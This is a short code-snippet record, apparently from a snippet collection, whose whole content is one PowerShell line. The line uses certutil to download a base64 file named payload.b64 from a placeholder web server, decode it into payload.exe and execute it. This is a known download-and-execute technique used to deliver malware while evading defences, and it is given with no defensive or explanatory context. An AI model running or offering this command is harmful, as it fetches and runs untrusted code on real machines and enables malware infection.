---
id: c0e6b940-4a5b-452c-963f-418b5e383932
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.016970+00:00'
updated_at: '2023-04-10T20:37:10.682710+00:00'
---

# Code Snippet c0e6b940

**Language**: Powershell

```powershell
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```


